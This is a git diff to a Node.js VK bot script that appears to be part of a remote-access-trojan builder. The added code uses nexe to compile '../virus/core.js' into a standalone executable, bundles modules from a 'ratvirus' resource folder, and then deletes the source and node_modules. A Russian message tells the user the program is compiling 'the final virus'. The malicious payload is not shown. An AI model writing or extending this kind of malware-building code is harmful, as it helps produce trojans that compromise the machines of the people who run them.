@@ -2,6 +2,7 @@
 let conf = require("./config.json")
 const { VKApi, ConsoleLogger, BotsLongPollUpdatesProvider } = require('node-vk-sdk')
 const fs = require("fs-extra")
+const nexe = require("nexe")
 
 let api = new VKApi({
     token: conf.group.token,
@@ -31,7 +32,21 @@ updatesProvider.getUpdates(updates => {
                             }
                             console.log("Чтобы закончить все настройки, нужно пройти на главную страницу, после чего, примите соглашение!\nА пока, программа скомпилирует для вас финальный вирус!")
                             setTimeout(() => {
-                                process.exit(0)
+                                nexe.compile({
+                                    input: '../virus/core.js',
+                                    output: `../virus/${conf.name}`,
+                                    resources: ['../../../ratresources/ratvirus/node_modules']
+                                }).then(() => {
+                                    fs.unlink('./../virus/core.js', (err) => {
+                                        if (!err) {
+                                            fs.unlink('../virus/node_modules', err => {
+                                                if (!err) {
+                                                    process.exit(0)
+                                                }
+                                            })
+                                        }
+                                    })
+                                })
                             }, 3000);
                         })
                     })
